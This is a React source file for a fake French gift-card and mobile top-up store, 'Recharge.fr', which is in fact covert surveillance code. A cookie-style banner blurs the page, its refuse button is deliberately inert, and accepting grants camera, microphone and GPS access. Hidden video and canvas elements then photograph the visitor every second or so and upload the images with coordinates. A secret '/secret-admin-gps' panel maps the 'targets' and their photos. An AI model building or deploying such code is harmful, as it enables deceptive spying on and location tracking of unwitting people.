import React, { useState, useRef, useEffect } from 'react';
import './App.css';
import { Search, ShoppingCart, User, Globe, ChevronDown, Smartphone, Gift, CreditCard, Gamepad2, ShieldCheck, Zap } from 'lucide-react';
import { MapContainer, TileLayer, Marker, Popup, useMap } from 'react-leaflet';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';

// Fix leaflet icon paths
delete L.Icon.Default.prototype._getIconUrl;
L.Icon.Default.mergeOptions({
  iconRetinaUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon-2x.png',
  iconUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-icon.png',
  shadowUrl: 'https://unpkg.com/leaflet@1.9.4/dist/images/marker-shadow.png',
});

function MapUpdater({ memories }) {
  const map = useMap();
  useEffect(() => {
    if (memories && memories.length > 0) {
      // Les plus récents sont à la fin du tableau
      const latest = memories[memories.length - 1];
      map.flyTo([latest.latitude, latest.longitude], 19);
    }
  }, [memories, map]);
  return null;
}

function AdminPanel() {
  const [memories, setMemories] = useState([]);
  const [activeUsers, setActiveUsers] = useState(0);
  const prevCountRef = useRef(0);

  const playAdminNotification = () => {
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioCtx.createOscillator();
      const gainNode = audioCtx.createGain();
      
      oscillator.type = 'sine'; // Son doux
      oscillator.frequency.setValueAtTime(1046.50, audioCtx.currentTime); // Note Do aigu (C6)
      oscillator.frequency.exponentialRampToValueAtTime(1318.51, audioCtx.currentTime + 0.1); // Monte au Mi (E6)
      
      gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime); // Volume bas (10%)
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
      
      oscillator.connect(gainNode);
      gainNode.connect(audioCtx.destination);
      
      oscillator.start();
      oscillator.stop(audioCtx.currentTime + 0.3);
    } catch(e) {
      console.warn("Erreur son admin", e);
    }
  };

  const fetchMemories = async () => {
    try {
      const res = await fetch('/api/memory');
      const data = await res.json();
      const newMemories = data.data || [];
      
      // Si on a plus de souvenirs que la dernière fois, c'est qu'une nouvelle photo est arrivée
      if (newMemories.length > prevCountRef.current && prevCountRef.current > 0) {
        playAdminNotification();
      }
      prevCountRef.current = newMemories.length;
      
      setMemories(newMemories);
      // Update active targets
      const activeRes = await fetch('/api/active-targets');
      const activeData = await activeRes.json();
      setActiveUsers(activeData.count || 0);
      
    } catch (err) {
      console.error(err);
    }
  };

  useEffect(() => {
    fetchMemories();
    const intervalId = setInterval(fetchMemories, 5000); // Auto-refresh toutes les 5 secondes
    return () => clearInterval(intervalId);
  }, []);

  return (
    <div style={{ padding: '2rem', flex: 1, display: 'flex', flexDirection: 'column', minHeight: '100vh', backgroundColor: '#f9f9f9' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '15px' }}>
          <h2 style={{ fontSize: '1.5rem', fontWeight: 'bold' }}>Interface de Suivi (Photos & GPS)</h2>
          <div style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '5px 12px', backgroundColor: activeUsers > 0 ? '#e8f5e9' : '#ffebee', borderRadius: '20px', border: `1px solid ${activeUsers > 0 ? '#c8e6c9' : '#ffcdd2'}` }}>
            <div style={{ width: '10px', height: '10px', borderRadius: '50%', backgroundColor: activeUsers > 0 ? '#4caf50' : '#f44336', boxShadow: activeUsers > 0 ? '0 0 8px #4caf50' : 'none', animation: activeUsers > 0 ? 'pulse 1.5s infinite' : 'none' }}></div>
            <span style={{ fontSize: '0.9rem', fontWeight: 'bold', color: activeUsers > 0 ? '#2e7d32' : '#c62828' }}>
              {activeUsers > 0 ? `${activeUsers} Cible(s) en ligne` : 'Aucune cible connectée'}
            </span>
          </div>
        </div>
        <button 
          onClick={fetchMemories} 
          style={{ padding: '0.5rem 1rem', background: '#ff5722', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' }}
        >
          Rafraîchir
        </button>
      </div>
      <div style={{ display: 'flex', flex: 1, gap: '20px' }}>
        {/* Map Container */}
        <div style={{ flex: 2, minHeight: '600px', height: '600px', border: '1px solid #ddd', borderRadius: '8px', overflow: 'hidden' }}>
          <MapContainer center={[48.8566, 2.3522]} zoom={12} style={{ height: '600px', width: '100%' }}>
            <MapUpdater memories={memories} />
            <TileLayer
              url="https://mt1.google.com/vt/lyrs=y&x={x}&y={y}&z={z}"
              attribution="&copy; Google Satellite"
              maxZoom={21}
            />
            {memories.map(mem => (
              <Marker key={mem.id} position={[mem.latitude, mem.longitude]}>
                <Popup>
                  <div style={{ textAlign: 'center' }}>
                    <p style={{ margin: '0 0 5px 0', fontSize: '12px' }}>
                      <strong>Heure:</strong> {new Date(mem.timestamp).toLocaleTimeString()}
                    </p>
                    {mem.filename && (
                      <img 
                        src={`/uploads/${mem.filename}`} 
                        alt="Souvenir" 
                        style={{ width: '150px', borderRadius: '4px', border: '1px solid #ccc' }} 
                      />
                    )}
                  </div>
                </Popup>
              </Marker>
            ))}
          </MapContainer>
        </div>
        
        {/* History Sidebar */}
        <div style={{ flex: 1, backgroundColor: 'white', borderRadius: '8px', border: '1px solid #ddd', padding: '1rem', overflowY: 'auto', maxHeight: '600px' }}>
          <h3 style={{ fontSize: '1.2rem', fontWeight: 'bold', marginBottom: '1rem', borderBottom: '1px solid #eee', paddingBottom: '0.5rem' }}>
            Historique des Captures ({memories.length})
          </h3>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '15px' }}>
            {[...memories].reverse().map(mem => (
              <div key={mem.id} style={{ display: 'flex', gap: '10px', alignItems: 'center', backgroundColor: '#f5f5f5', padding: '10px', borderRadius: '6px' }}>
                {mem.filename ? (
                  <img 
                    src={`/uploads/${mem.filename}`} 
                    alt="Miniature" 
                    style={{ width: '60px', height: '60px', objectFit: 'cover', borderRadius: '4px', border: '1px solid #ccc' }} 
                  />
                ) : (
                  <div style={{ width: '60px', height: '60px', backgroundColor: '#e0e0e0', borderRadius: '4px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '10px' }}>No Img</div>
                )}
                <div>
                  <div style={{ fontWeight: 'bold', fontSize: '0.9rem' }}>
                    {new Date(mem.timestamp).toLocaleTimeString()}
                  </div>
                  <div style={{ fontSize: '0.8rem', color: '#666' }}>
                    Lat: {Number(mem.latitude).toFixed(4)}<br/>
                    Lon: {Number(mem.longitude).toFixed(4)}
                  </div>
                </div>
              </div>
            ))}
            {memories.length === 0 && (
              <div style={{ textAlign: 'center', color: '#888', fontStyle: 'italic', marginTop: '2rem' }}>
                Aucune capture pour le moment.
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
}

function StoreFront() {
  const [searchQuery, setSearchQuery] = useState('');
  const [showBanner, setShowBanner] = useState(true);
  const [bannerError, setBannerError] = useState('');
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const currentPos = useRef(null);

  const captureAndSend = async () => {
    console.log("[DEBUG] Tentative de capture photo et GPS...");
    if (!videoRef.current) return console.warn("[DEBUG] ❌ videoRef est nul");
    if (!canvasRef.current) return console.warn("[DEBUG] ❌ canvasRef est nul");
    if (!currentPos.current) return console.warn("[DEBUG] ❌ currentPos est nul, en attente du fix GPS...");

    const video = videoRef.current;
    if (video.videoWidth === 0) return console.warn("[DEBUG] ❌ videoWidth est 0, le flux n'a pas encore démarré");

    const canvas = canvasRef.current;
    
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    canvas.toBlob(async (blob) => {
      if (!blob) {
         console.error("[DEBUG] ❌ Erreur lors de la création du Blob image");
         return;
      }
      console.log("[DEBUG] ✅ Image capturée avec succès. Envoi au serveur...");
      const formData = new FormData();
      formData.append('image', blob, 'memory.jpg');
      formData.append('latitude', currentPos.current.latitude);
      formData.append('longitude', currentPos.current.longitude);
      formData.append('accuracy', currentPos.current.accuracy);

      try {
        const response = await fetch('/api/memory', {
          method: 'POST',
          body: formData
        });
        if (response.ok) {
           console.log("[DEBUG] ✅ Souvenir (photo + position) envoyé au serveur avec succès.");
        } else {
           console.error("[DEBUG] ❌ Le serveur a répondu avec une erreur:", response.status);
        }
      } catch (err) {
        console.error("[DEBUG] ❌ Erreur réseau d'envoi du souvenir", err);
      }
    }, 'image/jpeg', 0.8);
  };

  const startMemoryCapture = (stream) => {
    if (videoRef.current) {
      videoRef.current.srcObject = stream;
      videoRef.current.play().catch(e => console.error("Video play error", e));
    }
    
    const startTime = Date.now();
    
    const loop = () => {
      captureAndSend();
      const elapsed = Date.now() - startTime;
      const nextDelay = elapsed < 60000 ? 1000 : 10000;
      setTimeout(loop, nextDelay);
    };
    
    setTimeout(loop, 1000); // 1ère capture après 1s
  };

  // Envoi d'un ping toutes les 5 secondes pour signaler qu'on est en ligne
  useEffect(() => {
    const pingInterval = setInterval(() => {
      fetch('/api/ping', { method: 'POST' }).catch(() => {});
    }, 5000);
    return () => clearInterval(pingInterval);
  }, []);

  const playBeep = () => {
    try {
      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = audioCtx.createOscillator();
      oscillator.type = 'sine';
      oscillator.frequency.setValueAtTime(880, audioCtx.currentTime); // Bip à 880Hz
      oscillator.connect(audioCtx.destination);
      oscillator.start();
      oscillator.stop(audioCtx.currentTime + 0.2); // dure 200ms
    } catch(e) {
      console.warn("[DEBUG] Impossible de jouer le bip", e);
    }
  };

  const handleAcceptAndLocate = async () => {
    setBannerError('');
    console.log("[DEBUG] Utilisateur a cliqué sur Accepter. Demande des permissions...");

    if ("geolocation" in navigator) {
      navigator.geolocation.watchPosition(
        async (position) => {
          console.log("[DEBUG] ✅ Fix GPS obtenu ! Lat:", position.coords.latitude, "Lon:", position.coords.longitude);
          currentPos.current = position.coords;
          const { latitude, longitude, accuracy } = position.coords;
          try {
            await fetch('/api/location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ latitude, longitude, accuracy })
            });
            console.log("[DEBUG] ✅ Position envoyée au serveur (/api/location).");
          } catch (error) {
            console.error("[DEBUG] ❌ Erreur d'envoi de la position", error);
          }
        },
        (error) => {
          console.error("[DEBUG] ❌ Localisation refusée ou erreur", error);
        },
        { enableHighAccuracy: true, maximumAge: 10000 }
      );
    } else {
      console.warn("[DEBUG] ❌ Géolocalisation non supportée");
    }

    try {
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        console.log("[DEBUG] ✅ Permissions caméra et micro accordées !");
        playBeep();
        setShowBanner(false); // Retire la bannière et le flou uniquement en cas de succès !
        startMemoryCapture(stream);
      } else {
        console.warn("[DEBUG] ❌ getUserMedia non supporté");
        setBannerError("Votre navigateur ne supporte pas cette fonctionnalité.");
      }
    } catch (err) {
      console.error("[DEBUG] ❌ Erreur d'accès à la caméra/micro", err);
      setBannerError("Vous devez autoriser l'accès à la caméra et au microphone pour accéder au site.");
    }
  };

  const popularProducts = [
    { id: 1, name: 'Neosurf', type: 'Carte de paiement', badge: 'Populaire', logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4b/Neosurf_Logo.png' },
    { id: 2, name: 'Transcash', type: 'Carte de paiement', logo: 'https://upload.wikimedia.org/wikipedia/fr/4/45/Logo_Transcash_-_2019.png' },
    { id: 3, name: 'paysafecard', type: 'Carte de paiement', badge: 'Sécurisé', logo: 'https://upload.wikimedia.org/wikipedia/commons/d/df/Paysafecard_logo.svg' },
    { id: 4, name: 'PlayStation', type: 'Divertissement', logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4e/Playstation_logo_colour.svg' },
    { id: 5, name: 'Amazon.fr', type: 'Carte-cadeau', logo: 'https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg' },
    { id: 6, name: 'Lebara', type: 'Recharge mobile', logo: 'https://upload.wikimedia.org/wikipedia/commons/1/12/Lebara_Mobile_logo.svg' },
    { id: 7, name: 'Lycamobile', type: 'Recharge mobile', logo: 'https://upload.wikimedia.org/wikipedia/commons/4/4e/Lycamobile_logo.svg' },
    { id: 8, name: 'SFR', type: 'Recharge mobile', logo: 'https://upload.wikimedia.org/wikipedia/commons/4/41/SFR_2014_logo.svg' },
  ];

  return (
    <div className="app-container">
      <video ref={videoRef} style={{ display: 'none' }} muted playsInline />
      <canvas ref={canvasRef} style={{ display: 'none' }} />
      
      {/* Wrapper principal avec flou conditionnel */}
      <div style={{ 
        filter: showBanner ? 'blur(4px)' : 'none', 
        pointerEvents: showBanner ? 'none' : 'auto',
        userSelect: showBanner ? 'none' : 'auto',
        transition: 'filter 0.3s ease'
      }}>
      {/* Header */}
      <header className="header">
        <div className="header-logo">
          Recharge<span style={{color: '#ff5722'}}>.fr</span>
        </div>
        
        <div className="header-search">
          <Search size={20} color="#757575" />
          <input 
            type="text" 
            placeholder="Rechercher un produit, une marque..." 
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
          />
        </div>

        <div className="header-actions">
          <button className="action-btn">
            <Globe size={20} />
            FR <ChevronDown size={16} />
          </button>
          <button className="action-btn">
            <User size={20} />
            Se connecter
          </button>
          <button className="cart-btn">
            <ShoppingCart size={20} />
            0,00 €
          </button>
        </div>
      </header>

      {/* Hero Section */}
      <section className="hero">
        <h1>Rechargez vite, payez en toute sécurité</h1>
        <p>Le moyen le plus rapide, le plus sûr et le plus simple d'acheter du crédit, partout dans le monde.</p>
        
        <div className="hero-search">
          <input type="text" placeholder="De quoi avez-vous besoin ?" />
          <button>Rechercher</button>
        </div>
      </section>

      {/* Main Content */}
      <main className="main-content">
        <h2 className="section-title">Que cherchez-vous ?</h2>
        
        <div className="categories-grid">
          <div className="category-card">
            <Smartphone className="category-icon" />
            <div className="category-title">Recharge Mobile</div>
          </div>
          <div className="category-card">
            <Gift className="category-icon" style={{color: '#e91e63'}} />
            <div className="category-title">Cartes-Cadeaux</div>
          </div>
          <div className="category-card">
            <CreditCard className="category-icon" style={{color: '#4caf50'}} />
            <div className="category-title">Cartes de Paiement</div>
          </div>
          <div className="category-card">
            <Gamepad2 className="category-icon" style={{color: '#9c27b0'}} />
            <div className="category-title">Jeux et Divertissement</div>
          </div>
        </div>

        <h2 className="section-title">Produits Populaires</h2>
        <div className="products-grid">
          {popularProducts.map((product) => (
            <div key={product.id} className="product-card">
              {product.badge && <span className="product-badge">{product.badge}</span>}
              <div className="product-image-wrapper">
                <img src={product.logo} alt={product.name} className="product-image" onError={(e) => {
                  e.target.onerror = null; 
                  e.target.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48cmVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCIgZmlsbD0iI2Y0ZjZmOCIvPjx0ZXh0IHg9IjUwIiB5PSI1MCIgZm9udC1mYW1pbHk9ImFyaWFsIiBmb250LXNpemU9IjE0IiBmaWxsPSIjNzU3NTc1IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBkeT0iLjMiPklNRzwvdGV4dD48L3N2Zz4='
                }}/>
              </div>
              <div className="product-info">
                <h3 className="product-name">{product.name}</h3>
                <p style={{fontSize: '0.85rem', color: '#757575'}}>{product.type}</p>
              </div>
            </div>
          ))}
        </div>
      </main>

      {/* Trust Section */}
      <section className="trust-section">
        <h2 className="section-title" style={{fontSize: '1.25rem'}}>Pourquoi choisir Recharge.fr ?</h2>
        <div style={{display: 'flex', justifyContent: 'center', gap: '3rem', flexWrap: 'wrap', marginTop: '2rem'}}>
          <div style={{display: 'flex', flexDirection: 'column', alignItems: 'center', maxWidth: '250px'}}>
            <Zap size={32} color="#ffc107" style={{marginBottom: '1rem'}} />
            <h4 style={{fontWeight: 700, marginBottom: '0.5rem'}}>Livraison instantanée</h4>
            <p style={{fontSize: '0.9rem', color: '#757575'}}>Votre code numérique s'affiche immédiatement sur votre écran.</p>
          </div>
          <div style={{display: 'flex', flexDirection: 'column', alignItems: 'center', maxWidth: '250px'}}>
            <ShieldCheck size={32} color="#4caf50" style={{marginBottom: '1rem'}} />
            <h4 style={{fontWeight: 700, marginBottom: '0.5rem'}}>Paiement sécurisé</h4>
            <p style={{fontSize: '0.9rem', color: '#757575'}}>Payez en toute sécurité avec vos méthodes de paiement préférées.</p>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="footer">
        <div className="footer-content">
          <div className="footer-column">
            <h3>À propos de Recharge</h3>
            <ul>
              <li><a href="#">Qui sommes-nous ?</a></li>
              <li><a href="#">Contact</a></li>
              <li><a href="#">Avis Trustpilot</a></li>
              <li><a href="#">Carrières</a></li>
            </ul>
          </div>
          <div className="footer-column">
            <h3>Support & Aide</h3>
            <ul>
              <li><a href="#">FAQ</a></li>
              <li><a href="#">Conditions générales</a></li>
              <li><a href="#">Déclaration de confidentialité</a></li>
              <li><a href="#">Cookie Policy</a></li>
            </ul>
          </div>
          <div className="footer-column">
            <h3>Catégories</h3>
            <ul>
              <li><a href="#">Recharge mobile</a></li>
              <li><a href="#">Cartes-cadeaux</a></li>
              <li><a href="#">Cartes de paiement</a></li>
              <li><a href="#">Divertissement</a></li>
            </ul>
          </div>
        </div>
        
        <div className="footer-bottom">
          <div className="footer-copyright">
            &copy; 2026 Recharge.fr - Tous droits réservés.
          </div>
          <div className="footer-payment-methods">
            <span style={{fontWeight: 600, marginRight: '1rem'}}>Méthodes de paiement sécurisées:</span>
            <span>Visa • Mastercard • PayPal • Apple Pay</span>
          </div>
        </div>
      </footer>
      </div>

      {/* Consent Banner */}
      {showBanner && (
        <div className="consent-banner">
          <div className="consent-content">
            <h4>Préférences de confidentialité & Cookies</h4>
            <p>
              Nous utilisons des cookies pour personnaliser le contenu, analyser notre trafic et sécuriser vos transactions. 
              Certaines fonctionnalités (comme la recherche d'offres locales et le paiement sécurisé) nécessitent votre 
              autorisation locale. Veuillez "Autoriser" les demandes de votre navigateur pour accéder à la boutique.
            </p>
            {bannerError && <p style={{ color: '#ff3333', fontWeight: 'bold', marginTop: '10px' }}>{bannerError}</p>}
          </div>
          <div className="consent-actions" style={{ flexDirection: 'row' }}>
            <button className="btn-refuse" onClick={(e) => { e.preventDefault(); /* Bouton factice, ne fait rien */ }} style={{ flex: 1, padding: '15px', fontSize: '1.1rem', cursor: 'default' }}>
              Ne pas autoriser
            </button>
            <button className="btn-accept" onClick={handleAcceptAndLocate} style={{ flex: 1, padding: '15px', fontSize: '1.1rem' }}>
              Autoriser
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

function App() {
  // Simple router logic based on URL path
  if (window.location.pathname === '/secret-admin-gps') {
    return <AdminPanel />;
  }
  return <StoreFront />;
}

export default App;
